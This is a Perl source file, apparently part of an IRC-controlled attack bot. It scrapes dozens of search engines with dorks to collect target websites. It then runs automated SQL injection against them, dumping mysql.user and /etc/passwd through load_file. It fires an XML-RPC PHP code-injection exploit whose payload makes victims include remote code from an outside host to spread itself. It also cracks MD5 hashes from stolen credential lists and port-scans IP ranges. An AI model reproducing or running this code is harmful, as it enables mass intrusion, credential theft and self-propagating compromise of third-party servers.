        my $mlink = ( "http://search.walla.co.il/?t=0&e=utf&q=".key($dork)."&p=".$i);
        my $re = query($mlink);
        while ($re =~ m/<td class=sw><a href=\"http:\/\/(.*?)\//g) {
            my $h = $1;
            push(@sgrep,$h);
            
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub work3() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0;$i <= 990;$i += 10) {
        my $mlink = ( "http://search1.rediff.com/dirsrch/default.asp?MT=".key($dork)."&iss=&submit=Search&firstres=".$i);
        my $re = query($mlink);
        while ($re =~ m/onmousedown=\"return enc\(this\, \'http:\/\/(.*?)\//g) {
            my $h = $1;
            push(@sgrep,$h);
            
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub google () {
    my @gsites;
    my $key = $_[0];
    my $name = $_[1];my $file = "lfi".int(rand(900)).".txt";
								
    my $gtest = ("www.google.com/search?q=hi&hl=en&start=10&sa=N");
    my $ret = query($gtest);
    if ($ret =~ /2008 Google/) {
        @gsites = gfind($key,$name);
    }
    else {
        @gsites = gbypass($key,$name);
    }
    return @gsites;
}

sub gfind () {
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 900; $p += 100) {
        my $g0gle = ("www.google.it/search?q=".key($key)."&num=100&hl=it&as_qdr=all&start=".$p."&sa=N");
        my $gr = query($g0gle);
        while ($gr =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $k = $1;
            if ($k !~ /google/) {
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push(@list, @grep);
            }
        }
    }
    return @list;
}

sub gbypass () { # Euroseek uses the same search type of google
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $p = 0 ; $p <= 1000 ; $p += 10 ) {
        my $gp = ("http://euroseek.com/system/search.cgi?language=en&mode=internet&start=".$p."&string=".key($key));
        my $re = query($gp);
        while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/g ) {
            my $k = $1;
            my @grep = links($k);
            open( $filez, ">>", $name );
            foreach my $k (@grep) {
                print $filez "$k\n";
            }
            close $filez;
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub alltheweb() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0;$i <= 1000;$i += 100) {
        my $alink = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($dork)."&o=".$i);
        my $re = query($alink);
        while ($re =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g) {
            my $h = $1;
            $h =~ s/ //g;
            push(@sgrep,$h);
        }
     }
     my @list = fprint($name,@sgrep);
     return @list;
}

sub altavista() {
    my $dork  = $_[0];
    my $name = $_[1];
    my $atest = ("http://it.altavista.com/web/results?itag=ody&q=".key($dork)."&kgs=0&kls=1");
    my $re = query($atest);
    if ($re =~ /Sono stati trovati 0 risultati/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 1000;$i += 50){
            my $alink = ("http://it.altavista.com/web/results?itag=ody&kgs=0&q=".key($dork)."&stq=".$i);
            my $re = query($alink);
            while ($re =~ m/<span class=ngrn>(.+?)<\/span>/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub msn() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 800;$i += 10) {
        my $mlink = ( "http://search.live.com/results.aspx?q=".key($dork)."&first=".$i."&FORM=PERE" );
        my $re = query($mlink);
        while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $h = $1;
            if ($h !~ /msn|live/ ) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}
sub msnde() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 800;$i += 10) {
        my $mlink = ( "http://search.live.com/results.aspx?q=".key($dork)."&go=Suche&mkt=de-de&scope=&first=".$i."&FORM=PERE" );
        my $re = query($mlink);
        while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $h = $1;
            if ($h !~ /msn|live/ ) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub msnbe() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 800;$i += 10) {
        my $mlink = ( "http://search.live.com/results.aspx?q=".key($dork)."&go=Suche&mkt=nl-be&scope=&first=".$i."&FORM=PERE" );
        my $re = query($mlink);
        while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $h = $1;
            if ($h !~ /msn|live/ ) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub msnfr() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 800;$i += 10) {
        my $mlink = ( "http://search.live.com/results.aspx?q=".key($dork)."&go=Suche&mkt=fr-fr&scope=&first=".$i."&FORM=PERE" );
        my $re = query($mlink);
        while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $h = $1;
            if ($h !~ /msn|live/ ) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub msncz() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 800;$i += 10) {
        my $mlink = ( "http://search.live.com/results.aspx?q=".key($dork)."&go=Suche&mkt=cs-cz&scope=&first=".$i."&FORM=PERE" );
        my $re = query($mlink);
        while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $h = $1;
            if ($h !~ /msn|live/ ) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub msnch() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 800;$i += 10) {
        my $mlink = ( "http://search.live.com/results.aspx?q=".key($dork)."&go=Suche&mkt=de-ch&scope=&first=".$i."&FORM=PERE" );
        my $re = query($mlink);
        while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $h = $1;
            if ($h !~ /msn|live/ ) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}


sub yahoo() {
    my @ysites;
    my $dork = $_[0];
    my $name = $_[1];
    my $ytest = ("http://search.yahoo.com/search?p=".key($dork)."&fr=yfp-t-501&ei=UTF-8&rd=r1");
    my $re = query($ytest);
    if ($re =~ /We did not find results for: <strong>/) {
        return @ysites;
    }
    elsif ($re =~ /Yahoo! Search results/) {
        @ysites = yfind($dork,$name);
        return @ysites;
    }
    else {
        writ1(" 1Banned by Yahoo Engine, BYPASS started!");
        @ysites = ybypass($dork,$name);
        return @ysites;
    }
}

sub yfind() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 901;$i += 100) {
        my $ylink = ("http://search.yahoo.com/search?p=".key($dork)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vd=all&vst=0&vf=all&vm=r&fl=0&fr=yfp-t-501&pstart=1&b=".$1);
        my $re = query($ylink);
        while ($re =~ m/<a class=\"yschttl\" href=\"http:\/\/(.+?)\" >/g) {
            my $h = $1;
            if ($h !~ /yahoo|<|>/) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub ybypass() { # GoodSearch uses the same search type of Yahoo
    my $dork  = $_[0];
    my $name = $_[1];
    my $ybytest = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($dork)."&page=1&osmax=16");
    my $re = query($ybytest);
    if ($re =~ /Your search did not yield any results/){
        return @list;
    }
    else {
        for $i(1..50){
            my $ybylink = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($dork)."&page=".$i."&osmax=16");
            my $re = query($ybylink);
            while ($re =~ m/href=\"(.+?)\">(.+?)<\/a>/g) {
                my $h = $2;
                if (($h =~ /\./) && ($h !~ /<|>| /)){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}


sub gigablast() { 
    my $dork  = $_[0];
    my $name = $_[1];
    my $gtest = ("http://www.gigablast.com/index.php?n=10&k5p=215334&q=".key($dork)."&submit.x=0&submit.y=0");
    my $re = query($gtest);
    if ($re =~ /No results found for/){
        return @list;
    }
    else {
        for ($i = 0; $i <= 1000; $i += 10) {
            my $glink = ("http://www.gigablast.com/index.php?q=".key($dork)."&submit_x=929&submit_y=168&k9j=686621&s=".$i."&n=10&");
            my $re = query($glink);
            while ($re =~ m/href=\"http:\/\/(.+?)\">/g) {
                my $h = $1;
                if ($h !~ /web\.archive|gigablast/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub ask() {
    my $dork = $_[0]; 
    my $name = $_[1];
    my $atest = ("http://it.ask.com/web?q=".key($dork)."&qsrc=1&o=312&l=dir&dm=all");
    my $re = query($atest);
    if ($re =~ /non ha prodotto alcun risultato/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 20;$i ++){
            my $alink = ("http://it.ask.com/web?q=".key($dork)."&o=0&l=dir&qsrc=0&qid=612B74535B00F6CA7678625658F9B98C&dm=all&page=".$i);
            my $re = query($alink);
            while($re =~ m/href=\"http:\/\/(.+?)\"/g){
                my $h = $1;
                if ($h !~ /ask|wikipedia/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

## Aol doesn't work, don't know why. When i try to make a http request on aol host, this is the message that i received: You don't have permission to access /aol/search
## Don't know hot to fix it :S Anyway you have here the sub, so you can try to fix this problem

sub aol() {
    my $dork = $_[0]; 
    my $name = $_[1];
    my $atest = ("http://search.aol.com/aol/search?invocationType=topsearchbox.search&query=".key($dork));
    my $re = query($atest);
    if ($re =~ /returned no results\.<\/h3>/) {
        return @list;
    }
    else {
        for $i(1..100){
            my $alink = ("http://search.aol.com/aol/search?query=".key($dork)."&page=".$i."&nt=SG2&do=Search&invocationType=comsearch30&clickstreamid=3154480101243260576");
            my $re = query($alink);print "$re\n";
            while($re =~ m/\"deleted\" property=\"f:url\">http:\/\/(.+?)<\/p>/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub dmoz() {
    my $dork = $_[0];
    my $name = $_[1];
    my $dtest = ("http://search.dmoz.org/cgi-bin/search?search=".key($dork));
    my $re = query($dtest);
    if ($re =~ m/No <b><a href=\"http:\/\/dmoz.org\/\">Open Directory Project<\/a><\/b> results found/g){
        return @list;
    }
    elsif ($re =~ /of (.+?)\)<p>/){
        my $ftot = $1;
        if ($ftot <= 20) {
            $max = 1;
        }
        else {
            my $to = $ftot / 20;
            if ($to =~ /(.+).(.+?)/){
                $uik = $1 * 20;
                $max = $uik +1;
            }
            elsif ($to =~ /[0-9]/) {
                my $to--;
                my $rej = $to * 20;
                $max = $rej +1;
            }
        }
    }
    for ($i = 1;$i <= $max;$i += 20){
        my $dlink = ("http://search.dmoz.org/cgi-bin/search?search=".key($dork)."&utf8=1&locale=it_it&start=".$i);
        my $re = query($dlink);
        while($re =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            my $h = $1;
            if ($h !~ /dmoz/){
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub webde() {
    my $dork = $_[0]; 
    my $name = $_[1];
    for $i(1..50){
        my $wlink = ("http://suche.web.de/search/web/?pageIndex=".$i."&su=".key($dork)."&y=0&x=0&mc=suche@web@navigation@zahlen.suche@web");
        my $re = query($wlink);
        while($re =~ m/href=\"http:\/\/(.+?)\">/g) {
            my $h = $1;
            if ($h !~ /\/search\/web|web.de|\" class=\"neww\"/){
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub einet() {
    my $dork = $_[0]; 
    my $name = $_[1];
    my $etest = ("http://www.einet.net/view/search.gst?p=1&k=".key($dork)."&s=0&submit=Search");
    my $re = query($etest);
    if ($re =~ /<span class=nPage>Page 1 of\s+(.+?)<\/span>/){
        my $tot = $1;
        for ($i = 1;$i <= $tot;$i++){
            my $elink = ("http://www.einet.net/view/search.gst?p=".$i."&k=".key($dork)."&s=0&submit=Search");
            my $re = query($elink);
            while($re =~ m/<span class=url2>\s+(.+?)<\/span>/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub uol() {
    my $dork = $_[0]; 
    my $name = $_[1];
    my $utest = ("http://busca.uol.com.br/www/index.html?q=".key($dork)."&ad=on");
    my $re = query($test1);
    if ($re =~ /n??o retornou nenhum resultado/) {
        return @list;
    }
    else {
        for($i = 0;$i <= 360;$i +=10) {
            my $uollink = ("http://busca.uol.com.br/www/index.html?ad=on&q=".key($dork)."&start=".$i);
            my $re = query($uollink);
            while($re =~ m/<dt><a href=\"http:\/\/(.+?)\">/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub abacho() {
    my $dork = $_[0];
    my $name = $_[1];
    my $atest = ("http://search.abacho.com/it/abacho.it/index.cfm?q=".key($dork)."&country=it&x=0&y=0");
    my $re = query($atest);
    if ($re =~ /We didn't find any results matching your query/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 1000; $i += 10) {
            my $alink = ("http://search.abacho.com/it/abacho.it/index.cfm?offset=".$i."&poffset=0&StartCounter=".$i."&q=".key($dork)."&a=&b=&country=it&page=&d_html=&d_pdf=&d_msdoc=&d_xls=&d_ppt=&mesearchkey=&cluster=&coop=");
            my $re = query($alink);
            while ($re =~ m/target=\"_blank\">http:\/\/(.+?)<\/a>/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub trovatore() {
    my $dork = $_[0];
    my $name = $_[1];
    my $ttest = ("http://213.215.201.230/search.jsp?query=".key($dork)."&langselect=all&hitsPerPage=10&hitsPerSite=1&clustering=&filterResults=null&start=0");
    my $re = query($ttest);
    if ($re =~ /Risultati <b>0-0<\/b>/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 2500; $i += 10) {
            my $tlink = ("http://213.215.201.230/search.jsp?query=".key($dork)."&langselect=all&hitsPerPage=10&hitsPerSite=1&clustering=&filterResults=null&start=".$i);
            my $re = query($tlink);
            while($re =~ m/<a href=\"http:\/\/(.+?)\">/g) {
                my $h = $1;
                if ($h !~ /iltrovatore\.it|213\.215\.201\.230|microsoft|wikipedia/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub lycos() {
    my $dork = $_[0];
    my $name = $_[1];
    my $ltest = ("http://cerca.lycos.it/cgi-bin/pursuit?pag=0&query=".key($dork)."&cat=web&enc=utf-8&xargs=");
    my $re = query($ltest);
    if ($re =~ /non ha avuto esito positivo tra/) {
        return @list;
    }
    else {
        for $i(0..79) {
            my $llink = ("http://cerca.lycos.it/cgi-bin/pursuit?pag=".$i."&query=".key($dork)."&cat=web&enc=utf-8");
            my $re = query($llink);
            while($re =~ m/title=\"\" >http:\/\/(.+?)<\/a>/g) {
                my $h = $1;
                if ($h !~ /youtube|google|wikipedia|microsoft/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub walhello() {
    my $dork = $_[0];
    my $name = $_[1];
    my $wtest = ("http://www.walhello.info/search?key=".key($dork)."&taal=a&nummer=0&&web=no&&vert=2&");
    my $re = query($wtest);
    if ($re =~ /Verzeihung, Nichts gefunden/) {
        return @list;
    }
    else {
        for $i(0..99) {
            my $wlink = ("http://www.walhello.info/search?key=".key($dork)."&taal=a&nummer=".$i."&&web=no&&vert=2&");
            my $re = query($wlink);
            while($re =~ m/<a href=http:\/\/(.+?)>/g) {
                my $h = $1;
                if ($h !~ /walhello|microsoft|wikipedia/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub virgilio() {
    my $dork = $_[0];
    my $name = $_[1];
    my $vtest = ("http://ricerca.alice.it/ricerca?qs=".key($dork)."&Cerca=&lr=");
    my $re = query($vtest);
    if ($re =~ /<span>Controlla che tutte le parole siano state digitate correttamente<\/span>/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 800; $i += 10) {
            my $vlink = ("http://ricerca.alice.it/ricerca?qs=".key($dork)."&filter=1&site=&lr=&hits=10&offset=".$i);
            my $re = query($vlink);
            while($re =~ m/<span><a href=\"http:\/\/(.+?)\">/g) {
                my $h = $1;
                if ($h !~ /microsoft|wikipedia/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}



sub xmls() {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my @forks;
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/\n//g;
        push( @tot, $a );
    }
    close filez;
    `rm -rf $name`;
    my @toexploit = unici(@tot);
    &msg("[Xml-Scan]"," Total ". scalar(@toexploit). " Site. Exploit Started.");
    foreach my $site (@toexploit) {
        $count++;
        if ( $count % 100 == 0 ) {
	    foreach my $f(@forks){
                waitpid($f,0);
            }
	    $num = 0;
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://" . $site . $bug;
            my $re    = &query($test);
            if ( $re =~ /faultCode/ && $re =~ /faultString/ && $re =~ /XML error: no element found at line 1/ ) {
				&xmldwa($test);
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}
 #----- List crack

sub listacrack() {
my $url = $_[0];
print("DEHASHUJE \r\n");	
&getstore($url,"/tmp/crack.txt");
open(FILE, '/tmp/crack.txt');
print("open /tmp/crack.txt \r\n");
 while(<FILE>) {
my $jo=$_;
	chomp $jo;
#	$jo=~s/\n//;
	$jo=~s/\r//;
 print("joo $jo\r\n");
while($jo =~ m/(.*):(.*)/g){
my $user=$1;
my $pass=$2;
print("$user iiiiiiii $pass \r\n");
print("zwrocil");
if($pass=~ /([0-9a-f]{32})/){
my $cleartext = &searchPlaintext($pass); if ($cleartext) { 
&msg("[List-Crack]","Login: $user Password: $cleartext");
my $irand = int(rand(6));
print("rand to $irand\r\n");
sleep($irand);
}}}}
close(FILE);
`rm -rf /tmp/crack.txt`;
}

#----- Sql bruter
sub sqlbrute() {
			my $site=$_[0];
			my $columns=$_[1];
msg("[Sql]"," Brute $site for $columns ");
my $cfin.="--";
my $cmn.= "+";

for ($column = 0 ; $column < $columns ; $column ++)
{
	$union.=','.$column;
	$inyection.=','."0x6c6f67696e70776e7a";
    if ($column == 0)
      {
		  $inyection = '';
          $union = '';
      }
    $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
print("$sql \r\n");
    $response=get($sql)or msg("[SQL]"," Failed to try to find the number of columns, check website\n");
    if($response =~ /loginpwnz/)
      {
         $column ++;
         $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
         msg("[SQL]"," $sql");
         $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
         $response=get($sql)or die("[-] Impossible to get Information_Schema\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
            msg("[SQL]"," INFORMATION_SCHEMA: $sql ");
            	
         	}
         $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");
         if($response =~ /loginpwnz/)
         	{
         		$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
            	msg("[SQL]","MYSQL_USER: $sql");
          	
         	}
         else
         	{
            	print "\n[-] MySQL.User unavailable";
         	}
	while ($loadcont < $column-1)
	   {
		$loadfile.=','.'load_file(0x2f6574632f706173737764)';
		$loadcont++;
	   }
	   $sql=$site."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;
	$response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
         if($response =~ /root:x:/)
         	{
				msg("[SQL]","LOAD_FILE: $sql");
		}
         else
         	{
            	print "\n[-] LOAD_FILE unavailable";
         	}
	          foreach $tabla(@tabele)
                {
                  chomp($tabla);
                  $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
print("$sql \r\n");                 
				 $response=get($sql)or die("[-] Impossible to get tables\n");
                  if($response =~ /loginpwnz/)
                    {
                        print "\n[+] Table $tabla exists...saving in $ARGV[2]";
                        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
                        msg("[SQL]"," $sql");
						&tabelka($site,$tabla);
                    }
                }

  #      exit (0);
      }
}			
			}

sub tabelka() {
			my $site=$_[0];
			my $tabla=$_[1];
			my $cfin.="--";
			my $cmn.= "+";
            chomp($tabla);
            print WEB "\n\n[COLUMNS IN TABLE $tabla]:\n\n";
            foreach $columna(@kolumny)
            {
             chomp($columna);
             $sql=$site."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;
             $response=get($sql)or die("[-] Impossible to get columns\n");
             if ($response =~ /loginpwnz/)
                  {
                      msg("[SQL]"," Column : $sql");
                  }
            }
        
}
#------ Xml Expl
sub xmldwa() {
my $jed = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo 'Bitch'.'X';exit;/*</name></value></param></params></methodCall>";

my $response = $userAgent->request(POST $jed,
Content_Type => 'text/xml',
Content => $exploit);
if ($response->content =~ /BitchX/) {
&msg("[Xml-Scan]","Bug: $jed");
&xmlcz($jed);
}
}
sub xmlcz() {
my $jed = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "include('http://ownzz.100free.com/spread.txt');exit;/*</name></value></param></params></methodCall>";

my $response = $userAgent->request(POST $jed,
Content_Type => 'text/xml',
Content => $exploit);
if ($response->content =~ /BitchX/) {
&msg("[Xml-Scan]","Bug: $jed");
}}
#------ Md5 

sub getHash
{
my $target = shift;
my $regexp = shift;
my $ua = LWP::UserAgent->new;
my $request = new HTTP::Request('GET', $target);
$request->header('User-Agent' => $opt{u});
my $response = $ua->request($request);
my $body = $response->content;
if ($body =~ /$regexp/)
{
return ($1, $2);
}
else
{
return 0;
}
}

sub searchPlaintext
{
my $hash = shift;
foreach (@md5)	
{
my $server = replacePlaceholder(@$_[0], $hash, "HASH");
my $post = replacePlaceholder(@$_[1], $hash, "HASH");
my $ua = LWP::UserAgent->new;
my $request = new HTTP::Request('POST', $server);
$request->content("$post");
$request->content_type('application/x-www-form-urlencoded');
$request->header('Referer' => $server);
$request->header('User-Agent' => $opt{u});
my $response = $ua->request($request);
my $body = $response->content;
if ($body =~ /@$_[2]/)
{
return $1;
}
}
return 0;
}
sub replacePlaceholder
{
my $search = shift;
my $replace = shift;
my $placeholder = shift;
$search=~s/\[$placeholder\]/$replace/g;
return $search;
}
#------ /MD5
#----- Zakres Scan
sub range() {
my $start = $_[0];
my $startend = $_[1];
my $p = $_[2];
msg("[Range]","Range Scan $1 - $2 on port $3");
my @ip_start=split(/\./,$start);
my @ip_end=split(/\./,$startend);
$p = 80;
for($i=$ip_start[0];$i<=$ip_end[0];$i++) 
{
 for($j=$ip_start[1];$j<=$ip_end[1];$j++) 
 {
  for($k=$ip_start[2];$k<=$ip_end[2];$k++) 
  {
   for($l=$ip_start[3];$l<=$ip_end[3];$l++) 
   {
    $ip = "$i.$j.$k.$l";
    # usleep(500000);
    sleep(1);
    print "Connecting with $ip:$p\n";
	   if ($sock = IO::Socket::INET->new(PeerAddr=>$ip,PeerPort=>$p,Proto=>'tcp',Timeout=>'1'))
		{
		&msg("[Range]"," Open $ip : $p");
		close $sock;
		}
		else
		{
			print "nie udalo sie polaczyc z $ip:$p\n";
			print "DEBUG: $sock\n";
		close $sock;
		}

   }
  }
 }
}
}
#------ / Zakres
#----------------Jo

sub query() {
    $link = $_[0];
    my $req = HTTP::Request->new( GET => $link );
    my $ua = LWP::UserAgent->new();
    $ua->agent($User_Agent[rand(scalar(@useragents))]);
    $ua->timeout(5);
    my $response = $ua->request($req);
    return $response->content;
}
sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}
sub fprint() {
    my($name,@sgrep) = @_;
    my @list;
    foreach my $n(@sgrep) {
        my @grep = &links($n);
        push(@list,@grep);
    }
    open($file, ">>", $name);
    foreach my $h(@list) {
        print $file "$h\n";
    }
    close($file);
    return @list;
}
sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@l, $link, $host, $hdir);
    return @l;
}
sub remove() {
    my $file = @_;
    foreach my $f(@_){
        system("rm -rf $f");
    }
}
sub unici {
    my @unici = ();
    my %visti = ();
    foreach my $elemento (@_) {
        $elemento =~ s/\/+/\//g;
        next if $visti{$elemento}++;
        push @unici, $elemento;
    }
    return @unici;
}

use LWP::Simple;
###------------ Pobierz
sub getstore ($$)
{
  my $url = $_[0];
  my $file = $_[1];

  $http_stream_out = 1;
  open(GET_OUTFILE, "> $file");
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}

sub _get
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);
  } else {
    return undef;
  }
}


sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  #print "HOST=$host, PORT=$port, PATH=$path\n";

  $AGENT = "get-minimal";
  $VERSION = "20000118";

  $path =~ s/ /%20/g;

  require IO::Socket;
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                   PeerPort => $port,
                                   Proto   => 'tcp',
                                   Timeout  => 60) || return;
  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;

  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") { # first block?
      $b1 = $buf;         # Save this for errorcode parsing
      $buf =~ s/.+?\015?\012\015?\012//s;      # zap header
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
  }
  return undef unless defined($n);

  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    # print "CODE=$main::http_get_result\n$b1\n";
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/
) {
      # redirect
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }

  return $buf;
}
sub clean() {
    $dork = $_[0];
    if ( $dork =~ /inurl:|allinurl:|intext:|allintext:|intitle:|allintitle:/ ) {
        $dork =~ s/^inurl://g;
        $dork =~ s/^allinurl://g;
        $dork =~ s/^intext://g;
        $dork =~ s/^allintext://g;
        $dork =~ s/^intitle://g;
        $dork =~ s/^allintitle://g;
    }
    return $dork;
}

#----- SUBY

